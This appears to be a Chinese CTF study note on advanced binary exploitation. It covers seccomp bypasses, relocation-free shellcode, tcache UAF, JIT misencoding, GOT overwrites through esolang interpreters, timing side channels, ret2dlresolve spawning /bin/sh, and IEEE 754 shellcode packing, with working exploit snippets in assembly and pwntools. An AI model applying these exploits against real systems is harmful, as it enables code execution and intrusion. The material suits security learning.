---

phase: binary
vuln_class: [pwn, seccomp, uaf, ret2dlresolve, jit]
title: Pwn 进阶手法
summary: 保护机制齐全时，绕过点从「内存破坏」转到「语义误用」——seccomp 的过滤缝隙、类型/长度的假设、动态链接器的解析过程、数值表示的边界。
---

# Pwn 进阶手法

堆利用专项（House of Apple 2、House of Einherjar、House of Orange/Spirit/Lore/Force、堆布局、自定义分配器、unlink、musl heap、tcache stashing unlink）见 [[binary/漏洞利用/堆利用.md|堆利用]]；内核见 [[binary/漏洞利用/内核利用进阶手法.md|内核技巧]] 与 [[binary/漏洞利用/内核保护绕过.md|内核绕过]]；ROP 细节见 [[binary/漏洞利用/ROP 进阶.md|ROP 进阶]]；基础溢出见 [[binary/漏洞利用/栈与基础溢出.md|溢出基础]]。

## 0. 判据速查

| 卡在哪 | 手法 | 去哪节 |
|---|---|---|
| seccomp 只允许 `openat2`/漏了它 | `openat2` 绕过 | §1.1 |
| seccomp 对缓冲区地址设了上下界 | 读高地址、写低地址，中间 `rep movsb` 搬 | §1.2 |
| 只有 9 字节 shellcode 空间 | test + je 自旋，用超时做 1 bit 信道 | §7 |
| 有 UAF 但堆块大小受限 | 同尺寸结构体复用 tcache | §3 |
| JIT 有 off-by-one | 指令编码错位，用操作数字节藏 shellcode | §4 |
| 有任意内存读写（esolang 无界纸带） | 直接改 GOT | §5 |
| 数值以不同进制字符串存 | 进制转换后长度膨胀 → 堆溢出 | §6 |
| 栈分配按平衡树估算，实际树不平衡 | 栈溢出到返回地址 | §6.2 |
| 无任何泄漏，Partial RELRO | ret2dlresolve 伪造解析结构 | §8 |
| PIE 但 `info proc mappings` 每次基址一样 | 基址是常量，不用泄漏 | §9 |
| Windows 无格式化串但需要栈泄漏 | `RtlCaptureContext` 把 RSP 写进用户内存 | §10 |
| 只能写 N 个 double 但结果是可执行代码 | 固定指数位当整数容器 | §11 |

**核心判据**：保护越全，越要从「系统对某个输入的理解有偏差」下手 —— seccomp 的 syscall 白名单、动态链接器的惰性绑定、浮点数的指数位，都是这类偏差。

## 1. seccomp 绕过

### 1.1 `openat2` 漏网

`openat2`（syscall 437，Linux 5.6+）在大量 seccomp 规则里被漏掉，因为规则通常只拦 `open` / `openat`。

```c
struct open_how { u64 flags; u64 mode; u64 resolve; };   // 24 字节
// openat2(AT_FDCWD, filename, &open_how, sizeof(open_how))
```

**判据**：规则里有 `open`/`openat` 但 kernel ≥ 5.6。直接调 437 试试。

### 1.2 缓冲区地址上下界

seccomp 用 `SCMP_CMP_LE`/`SCMP_CMP_GE` 限制缓冲区地址时，常出现「读只能读高地址、写只能写低地址」的矛盾：

```text
read()  若 buf <= code_region + X  → KILL
write() 若 buf >= code_region + Y  → KILL
```

绕过：先读到允许区，再 `rep movsb` 搬到写允许区。

```nasm
lea rsi, [r14 + 0xc01]   ; buf > code_region+0xc00，过 read 检查
xor rax, rax             ; __NR_read
syscall
mov r13, rax             ; 保存长度

lea rsi, [r14 + 0xc01]   ; 源（高地址）
lea rdi, [r14 + 0x200]   ; 目标（低地址，< code_region+0x400）
mov rcx, r13
rep movsb

mov rdi, 1
lea rsi, [r14 + 0x200]   ; buf < code_region+0x400，过 write 检查
mov rdx, r13
mov rax, 1               ; __NR_write
syscall
```

**`rep movsb` 不经过 seccomp**（不是 syscall），所以它能突破「读写地址区间互斥」的约束。

### 1.3 无重定位的 shellcode 构造

pwntools 的 `asm()` 不支持前向标签引用。用 `jmp`/`call` 手搓：

```python
body = asm('''
    pop rbx              /* rbx = call 之后那条指令的地址 */
    mov r14, rbx
    and r14, -4096       /* 页对齐得到 code_region 基址 */
    mov rsi, rbx         /* 文件名指针 */
fail:
    mov rdi, 1
    mov rax, 60
    syscall
''')

call_offset = -(len(body) + 5)
call_instr  = b'\xe8' + p32(call_offset & 0xffffffff)
jmp_instr   = (b'\xeb' + bytes([len(body)])) if len(body) < 128 else (b'\xe9' + p32(len(body)))

shellcode = jmp_instr + body + call_instr + b"filename.txt\x00"
```

原理：`call` 把「字符串地址」压栈，`pop rbx` 取回。这样字符串放在 payload 末尾也能拿到绝对地址，无需重定位表。

### 1.4 从反汇编读 seccomp 规则

```c
seccomp_rule_add(ctx, action, syscall_nr, arg_count, ...);
```

`scmp_arg_cmp` 结构：`arg`(+0x00, uint)、`op`(+0x04, int)、`datum_a`(+0x08, u64)、`datum_b`(+0x10, u64)。

```text
SCMP_CMP 操作符：NE=1  LT=2  LE=3  EQ=4  GE=5  GT=6  MASKED_EQ=7
默认动作 0x7fff0000 = SCMP_ACT_ALLOW
```

## 2. ROP 中的 rdx 控制

`rdx` 是第三个参数寄存器，`read`/`write` 的长度都由它控制，但 gadget 往往最少。完整 gadget 与构造见 [[binary/漏洞利用/ROP 与 shellcode.md|ROP 与 shellcode]]。

## 3. UAF

**典型形态**：菜单式 create/delete/view，`free()` 后没把指针置 NULL。

```text
1. 创建对象 A（块内含函数指针）
2. 通过 view/inspect 泄漏地址（绕 PIE）
3. 释放 A（留下悬垂指针）
4. 创建**同尺寸**对象 B（tcache 复用刚释放的块）
5. B 的数据覆盖 A 的函数指针为 win() 地址
6. 触发 A 的回调 → 跳到 win()
```

```python
create_report("sighting-0")             # 64 字节结构，回调指针在 +56
leak = inspect_report(0)                # 泄漏回调地址，算 PIE 基址
pie_base = leak - redaction_offset
win_addr = pie_base + win_offset

delete_report(0)                        # 释放，悬垂指针还在
create_signal(b"A"*56 + p64(win_addr))  # 同尺寸覆盖回调
analyze_report(0)                       # 调用悬垂指针 → win()
```

**同尺寸是硬条件**：tcache 按 size class 分桶，尺寸不同不会复用同一个块。

## 4. JIT 编译漏洞

**形态**：指令编码的 off-by-one 导致机器码错位。

```text
1. 找触发错误指令形式的边界值（例如 128 vs 127）
2. 错位后的字节被当成可执行指令
3. 控制 rax 指向可写内存，让非法解引用不崩
4. 把 shellcode 藏在减法指令的操作数字节里
5. 用 2 字节 jmp 把 4 字节的 shellcode 块串起来
```

2 字节指令技巧：

```text
push rdx; pop rsi    → 等价 mov rsi, rdx，占 2 字节
xor eax, eax         → 2 字节，设 syscall 号
not dl               → 2 字节，调整指针
```

最后用 `sys_read` 把完整 shellcode 读进 RWX 页，再跳过去。

## 5. 深奥语言改 GOT

**形态**：Brainfuck / Pikalang 解释器的纸带无边界，等于相对缓冲区基址的任意读写。

```text
1. 纸带指针起始位置已知
2. 前后移动指针到 GOT 表项（如 strlen@GOT）
3. 逐字节把 GOT 改成 system() 地址
4. 下次调用该函数就变成 system(可控字符串)
```

**判据**：解释器没有对指针做边界检查。**无界纸带 = 任意读写原语**。

## 6. 长度/结构假设

### 6.1 进制转换导致堆溢出

```text
1. 用短表示存数（base-36）
2. 转成长表示（base-2）
3. 长字符串溢出到相邻堆块的 metadata
4. 被改坏的块与目标分配重叠
```

约束：字符集只有 `0-9a-z`，可写字节值受限 —— 溢出内容要在这个集合里构造。

### 6.2 树结构栈分配不足

**漏洞**：栈空间按「平衡树」估算（`2^depth` 个节点），实际遍历不平衡树时用的栈更多，直接溢出。

```text
构造极不平衡的树 → 遍历时栈溢出 → 覆盖返回地址 → ret2win
（PIE 下用部分覆盖，只改低 2 字节）
```

## 7. 9 字节 shellcode + 超时信道

只有 9 字节空间，写不下完整 read/write。写 7 字节的 `test` 加 2 字节 `je` 自旋：

```asm
f6 05 02 00 00 00 X    test BYTE PTR [rip+0x2], X
74 fe                  je   0
```

```text
按位读 flag：
  翻转立即数 X，连一次，测往返时间
  < 2 秒 → 崩了（该位与 X 不同）
  > 2 秒 → 挂住了（该位与 X 相同，自旋触发）
```

**核心**：任何「一个分支挂住、另一个分支崩溃」的操作都能当 1 bit 信道。`hlt`、页错误、显式死循环都行。

## 8. ret2dlresolve

伪造 `Elf64_Sym` 和 `Elf64_Rela`，骗动态链接器在下一次 PLT 调用时解析出任意函数（如 `system`）。**完全不需要泄漏**。

```python
from pwn import *

rop = ROP(elf)
dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])

rop.read(0, dlresolve.data_addr)     # 把伪造结构读到已知地址
rop.ret2dlresolve(dlresolve)

io.sendline(flat({offset: rop.chain()}))
io.sendline(dlresolve.payload)
```

手工构造的核心计算：

```python
SYMTAB = elf.dynamic_value_by_tag('DT_SYMTAB')
STRTAB = elf.dynamic_value_by_tag('DT_STRTAB')
JMPREL = elf.dynamic_value_by_tag('DT_JMPREL')

# PLT stub 会 push 这个索引，必须算对
reloc_index = (fake_rela_addr - JMPREL) // 0x18      # sizeof(Elf64_Rela)

# 假 Elf64_Sym.st_name = 相对 STRTAB 的偏移
fake_sym_st_name = fake_string_addr - STRTAB
```

**前提条件**：

- **Partial RELRO**。Full RELRO 在加载时就把所有符号解析完，惰性绑定不存在，这招失效。
- 有可写内存放伪造结构。

## 9. PIE 基址其实是常量

**判据**：`info proc mappings` 多次运行基址相同。很多发行版上 32 位 PIE 的 `mmap_base` 就是 `0x56555000`。

```python
PIE_BASE = 0x56555000
print_flag = PIE_BASE + 0x6dc

payload  = cyclic(30)
payload += p32(print_flag)
```

**先枚举映射再假设需要泄漏**。同类现象：`ulimit -s unlimited` 下栈基址固定为 `0x7fff_f000`。这类题不需要任何 leak。

## 10. Windows 栈泄漏

没有格式化串但需要栈地址时，`ntdll!RtlCaptureContext(&ctx)` 会把当前寄存器组（含 `Rsp`）写进用户提供的 `CONTEXT` 结构：

```c
CONTEXT ctx;
RtlCaptureContext(&ctx);
printf("rsp = %p\n", (void*)ctx.Rsp);
```

Windows NT API 里有一批「dump 寄存器状态」的辅助函数（供栈展开和异常处理用），它们把 `RSP` 原样拷进用户内存，是确定性的信息泄漏原语。

## 11. IEEE 754 当 shellcode 容器

**形态**：只能写 6 个 double，然后程序算 `(d1+...+d6)/6` 并把结果当代码执行。

**关键**：把指数位固定为 `0x4330`（`1075 = 1023 + 52`），此时 double 是精确的 52 位整数容器，加法等价于整数加法且无舍入。

```python
def shellcode_to_double(b):
    # 钉死指数位，payload 位原样保留
    return struct.unpack('d', b'\x30\x43' + b[:6])[0]

d1 = shellcode_to_double(sc[ 0: 6])
d2 = shellcode_to_double(sc[ 6:12])
d3 = shellcode_to_double(sc[12:18])
d4 = shellcode_to_double(sc[18:24])
d5 = shellcode_to_double(sc[24:30])
# d6 解出来，使 6*target == d1+d2+d3+d4+d5+d6
target_int = int_from_shellcode(sc_full)
d6 = 6*target_int - (d1_int + d2_int + d3_int + d4_int + d5_int)
```

**推广**：只要指数位固定为 `bias + 尾数位数`，任何浮点类型都是无损整数容器。「只能写 N 个 double」等于「能写 N×6 字节原始数据」。32 位 float 用 `bias + 23`，同理。

## 12. 纪律

- **保护越全，越要找语义偏差**。seccomp 白名单、惰性绑定、浮点指数位，都是「系统理解与直觉不一致」的地方。
- **seccomp 先看有没有漏 syscall**。`openat2`、`sendfile`、`splice` 是常见漏网。
- **`rep movsb` 不受 seccomp 限制**。读写地址区间互斥时，用它做中转。
- **UAF 必须同尺寸**。tcache 按 size class 分桶，差一个字节都不复用。
- **无界纸带/无界索引就是任意读写**，别去找更复杂的原语。
- **ret2dlresolve 前先确认 RELRO 是 Partial**。Full RELRO 下这招完全失效。
- **先枚举 `info proc mappings` 再决定要不要泄漏**。PIE 基址常常是常量。
- **小空间用超时做信道**。1 bit 的信道乘以位数，也能拿到完整 flag。
